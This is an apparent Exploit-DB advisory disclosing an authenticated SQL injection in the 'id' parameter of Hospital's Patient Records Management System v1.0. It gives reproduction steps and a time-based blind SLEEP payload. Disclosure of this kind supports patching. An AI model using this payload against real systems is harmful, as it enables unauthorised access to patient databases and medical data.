# Hospital's Patient Records Management System v1.0 - 'id' SQL Injection (Authenticated)
Original link : [https://www.exploit-db.com/exploits/50630](https://www.exploit-db.com/exploits/50630)
```bash
# Exploit Title: Hospital's Patient Records Management System v1.0 - 'id' SQL Injection (Authenticated)
# Date: 2021-12-30
# Exploit Author: twseptian
# Vendor Homepage: https://www.sourcecodester.com/php/15116/hospitals-patient-records-management-system-php-free-source-code.html
# Software Link: https://www.sourcecodester.com/sites/default/files/download/oretnom23/hprms_0.zip
# Version: v1.0
# Tested on: Kali Linux 2021.4
```

## SQL Injection
SQL injection is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. Hospital's Patient Records Management System v1.0 is vulnerable to SQL injection via the 'id' parameter on the patient list.

## Attack Vector
An attacker can compromise the database of the application using some automated(or manual) tools like SQLmap.

## Steps of reproduce:
- Step-1: On the dashboard navigate to 'Patient List', then go to 'Action' > 'View Records' page using the following URL:
http://localhost/hprms/admin/?page=patients/view_patient&id=1

- Step-2: Put the SQL Injection payloads in 'id' field.
time-based blind payload : `page=patients/view_patient&id=1' AND (SELECT 2664 FROM (SELECT(SLEEP(5)))ixec) AND 'XcAY'='XcAY`

- Step-3: Now, the Server target accepted our payload and the response got delayed by 5 seconds.
